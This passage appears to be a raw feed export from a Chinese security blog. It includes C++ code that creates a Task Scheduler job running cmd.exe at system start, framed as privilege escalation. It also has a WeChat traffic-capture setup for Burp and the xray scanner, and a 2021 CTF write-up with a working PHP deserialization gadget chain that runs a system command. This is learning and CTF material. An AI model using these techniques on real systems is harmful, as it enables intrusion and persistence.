XP。服务器需要 Windows Server 2008 或 Windows Server 2003。"></a>注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。</h3><h3 id="使用-Task-Scheduler-1-0-的几个注意点："><a href="#使用-Task-Scheduler-1-0-的几个注意点：" class="headerlink" title="使用 Task Scheduler 1.0 的几个注意点："></a>使用 Task Scheduler 1.0 的几个注意点：</h3><ul><li>创建计划任务需要管理员权限。</li><li>必须确保 Task Scheduler service 正在运行。</li><li>通过 COM 组件创建的计划任务,会在C:\windows\Tasks目录下创建一个同名的 JOB 文件。</li><li>同时需要为计划任务指定一个唯一的名称，如果指定的名称已被使用，则会导致任务创建失败。</li><li>该计划任务无法通过 schtasks 命令查询。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initguid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ole2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstask.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;msterr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WGetUserName</span><span class="params">(WCHAR* username, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取并显示计算机的名称。</span></span><br><span class="line">    <span class="keyword">char</span>   szName[<span class="number">255</span>];</span><br><span class="line">    ULONG   nLen = <span class="keyword">sizeof</span>(szName);</span><br><span class="line">    ::GetUserNameA(szName, &amp;nLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szName); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        username[i] = szName[i];</span><br><span class="line">    &#125;</span><br><span class="line">    username[<span class="built_in">strlen</span>(szName)] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, szName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    ITaskScheduler* pITS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用CoInitialize初始化COM库，然后  </span></span><br><span class="line">    <span class="comment">//调用CoCreateInstance获取Task Scheduler对象。  </span></span><br><span class="line">    hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        hr = CoCreateInstance(CLSID_CTaskScheduler,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            CLSCTX_INPROC_SERVER,</span><br><span class="line">            IID_ITaskScheduler,</span><br><span class="line">            (<span class="keyword">void</span>**)&amp;pITS);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            CoUninitialize();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 获取计算机的用户名</span></span><br><span class="line">    WCHAR username[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">    WGetUserName(username, <span class="keyword">sizeof</span>(username));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskScheduler::NewWorkItem创建新任务。  </span></span><br><span class="line">    WCHAR pwszTaskName[<span class="number">512</span>] = <span class="string">L"Test_Task"</span>;</span><br><span class="line">    ITask* pITask;</span><br><span class="line"></span><br><span class="line">    wcscat(pwszTaskName, username);</span><br><span class="line">    hr = pITS-&gt;NewWorkItem(pwszTaskName,         <span class="comment">// 任务名称</span></span><br><span class="line">        CLSID_CTask,          <span class="comment">// 类标识符</span></span><br><span class="line">        IID_ITask,            <span class="comment">// 接口标识符</span></span><br><span class="line">        (IUnknown**)&amp;pITask); <span class="comment">// 解决的任务</span></span><br><span class="line">    <span class="comment">//    接口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pITS-&gt;Release();          <span class="comment">// 释放对象</span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed calling NewWorkItem, error = 0x%x\n"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用ITask::SetApplicationName指定应用程序的名称</span></span><br><span class="line">    <span class="comment">//测试任务。</span></span><br><span class="line">    LPCWSTR pwszApplicationName = <span class="string">L"C:\\Windows\\System32\\cmd.exe "</span>;</span><br><span class="line">    hr = pITask-&gt;SetApplicationName(pwszApplicationName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set flag仅在登录时设置</span></span><br><span class="line">        hr = pITask-&gt;SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::EditWorkItem, "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅为登录设置用户名</span></span><br><span class="line">    hr = pITask-&gt;SetAccountInformation(<span class="string">L"Administrator"</span>, <span class="literal">NULL</span>); <span class="comment">//L"NT AUTHORITY\\SYSTEM"; </span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITask::CreateTrigger来创建一个新的触发器。</span></span><br><span class="line">    ITaskTrigger* pITaskTrigger;</span><br><span class="line">    WORD piNewTrigger;</span><br><span class="line">    hr = pITask-&gt;CreateTrigger(&amp;piNewTrigger,</span><br><span class="line">        &amp;pITaskTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::CreatTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义TASK_TRIGGER结构。注意,wBeginDay,</span></span><br><span class="line">    <span class="comment">//wBeginMonth和wBeginYear必须设置为一个有效的</span></span><br><span class="line">    <span class="comment">//分别为日、月、年。</span></span><br><span class="line">    TASK_TRIGGER pTrigger;</span><br><span class="line">    ZeroMemory(&amp;pTrigger, <span class="keyword">sizeof</span>(TASK_TRIGGER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加代码设置触发器结构?</span></span><br><span class="line">    pTrigger.cbTriggerSize = <span class="keyword">sizeof</span>(TASK_TRIGGER);</span><br><span class="line">    pTrigger.wBeginDay = <span class="number">20</span>;                  <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginMonth = <span class="number">1</span>;                <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginYear = <span class="number">1997</span>;              <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wStartHour = <span class="number">10</span>;</span><br><span class="line">    pTrigger.wStartMinute = <span class="number">10</span>;</span><br><span class="line">    pTrigger.MinutesDuration = <span class="number">600</span>;</span><br><span class="line">    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;   <span class="comment">//TASK_EVENT_TRIGGER_AT_SYSTEMSTART   </span></span><br><span class="line">    pTrigger.Type.Daily.DaysInterval = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskTrigger::SetTrigger来设置触发条件。  </span></span><br><span class="line">    hr = pITaskTrigger-&gt;SetTrigger(&amp;pTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITaskTrigger::SetTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用IPersistFile::Save将触发器保存到磁盘。  </span></span><br><span class="line">    IPersistFile* pIPersistFile;</span><br><span class="line">    hr = pITask-&gt;QueryInterface(IID_IPersistFile,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pIPersistFile);</span><br><span class="line">    hr = pIPersistFile-&gt;Save(<span class="literal">NULL</span>,</span><br><span class="line">        TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling IPersistFile::Save: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        pIPersistFile-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wprintf(<span class="string">L"The trigger was created and IPersistFile::Save was \n"</span>);</span><br><span class="line">    wprintf(<span class="string">L"called to save the new trigger to disk.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源。</span></span><br><span class="line">    pITask-&gt;Release();</span><br><span class="line">    pITaskTrigger-&gt;Release();</span><br><span class="line">    pIPersistFile-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Created task.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行后生成job文件</p></blockquote><p><img src="job.jpg" alt="生成的job文件"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10625?page=1" target="_blank" rel="noopener">关于计划任务的探究</a></p><p><a href="https://blog.csdn.net/yaoxuanzhi/article/details/57562955?ops_request_misc=&request_id=&biz_id=102&utm_term=C++%20Task%20Scheduler%202.0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-57562955.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187" target="_blank" rel="noopener">Task Scheduler 2.0的相关操作</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-2-0-interfaces?redirectedfrom=MSDN" target="_blank" rel="noopener">任务计划程序 2.0 接口</a></p><p><a href="https://www.cnblogs.com/hrhguanli/p/4095448.html" target="_blank" rel="noopener">计划任务中使用NT AUTHORITY\SYSTEM用户和普通管理员用户有什么差别</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/tasks" target="_blank" rel="noopener">Tasks</a></p><p><a href="https://blog.csdn.net/chantsky/article/details/82904942?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.pc_relevant_default&utm_relevant_index=10" target="_blank" rel="noopener">VC++创建计划任务的若干方式</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了= =&lt;/p&gt;</summary>
    
    
    
    <category term="win" scheme="https://chenzidu.github.io/categories/win/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>微信pc公众号及微信小程序抓取数据包</title>
    <link href="https://chenzidu.github.io/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://chenzidu.github.io/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/</id>
    <published>2021-11-22T01:01:48.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>总结以下微信的数据包抓取，免得忘记了。主要是针对微信PC端的小程序，以及微信PC的公众号抓取。利用了burp + proxifier + fiddler,xray 在开启被动扫描，burp流量转发至burp，自动扫描。</p><a id="more"></a><h1 id="微信小程序数据包抓取"><a href="#微信小程序数据包抓取" class="headerlink" title="微信小程序数据包抓取"></a>微信小程序数据包抓取</h1><p>整体思路：1、利用proxifier抓取微信小程序exe，流量转发至burp</p><p><img src="WeChatApp.jpg" alt="WeChatApp"></p><p>proxifier配置Servers，设置127.0.0.1:8080的https和http</p><p><img src="proxifierServers.jpg" alt="proxifierServers配置"></p><p>proxifier配置Rules将wechatapp.exe; wechatapplauncher.exe进行监听，基本上只会用到wechatapp，我看另一个也是app所以一起监听了，以防万一</p><p><img src="proxifierRules.jpg" alt="proxifierRules"></p><p>打开去哪儿，发现数据包抓取成功，proxifier将数据抓取</p><p><img src="wechatpro.jpg" alt="wechatapp数据包抓取"></p><p>proxifier将数据传至burp获取数据包，成功抓取小程序数据。</p><p><img src="wechatburp.jpg" alt="wechatburp数据包抓取.jpg"></p><h1 id="微信公众号数据包抓取"><a href="#微信公众号数据包抓取" class="headerlink" title="微信公众号数据包抓取"></a>微信公众号数据包抓取</h1><p>配置Fiddler web，配置8888端口，再配置gateway配置代理：127.0.0.1:8080</p><p><img src="Fiddler.jpg" alt="Fiddler配置"></p><p>成功配置后点击show current gateway info,测试是否相通</p><p><img src="Fiddlergateway.jpg" alt="Fiddlergateway"></p><p>burp成功获得数据包</p><p><img src="burpfiddler.jpg" alt="burp数据"></p><h1 id="xray配置扫描"><a href="#xray配置扫描" class="headerlink" title="xray配置扫描"></a>xray配置扫描</h1><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe webscan --listen <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8989</span> --html-output test.html</span><br></pre></td></tr></table></figure><p>burp配置上层代理规则，将流量转发至xray进行被动扫描</p><p><img src="burpxray.jpg" alt="burp配置上层代理"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;总结以下微信的数据包抓取，免得忘记了。主要是针对微信PC端的小程序，以及微信PC的公众号抓取。利用了burp + proxifier + fiddler,xray 在开启被动扫描，burp流量转发至burp，自动扫描。&lt;/p&gt;</summary>
    
    
    
    <category term="数据包抓取" scheme="https://chenzidu.github.io/categories/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2021-祥云杯web</title>
    <link href="https://chenzidu.github.io/2021/08/23/2021-%E7%A5%A5%E4%BA%91%E6%9D%AFweb/"/>
    <id>https://chenzidu.github.io/2021/08/23/2021-%E7%A5%A5%E4%BA%91%E6%9D%AFweb/</id>
    <published>2021-08-23T07:09:13.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>部分web，太菜了有些做不出来</p><a id="more"></a><h1 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h1><p>参考：<a href="https://xz.aliyun.com/t/9948" target="_blank" rel="noopener">https://xz.aliyun.com/t/9948</a><br>不过后来第四条链子被作者删了。<br><br>代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $output;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $processes = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">'jiang'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">DefaultGenerator</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $default;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;default = $default;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $streams = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $seekable = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $remoteStream;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $source;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $size=<span class="number">-10</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $buffer;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">'j'</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>(<span class="string">"closure/autoload.php"</span>);</span></span><br><span class="line"><span class="php">            $a = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;system(<span class="string">'cat /flag.txt'</span>);&#125;;</span></span><br><span class="line"><span class="php">            $a = \Opis\Closure\serialize($a);</span></span><br><span class="line"><span class="php">            $b = unserialize($a);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;source=$b;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><hr><h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><pre><code>通过POST请求发现报错，代码中使用file_get_contents，</code></pre><p>第一时间想到了利用伪协议读取，试了好多个，发现不是被禁用了就是不行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 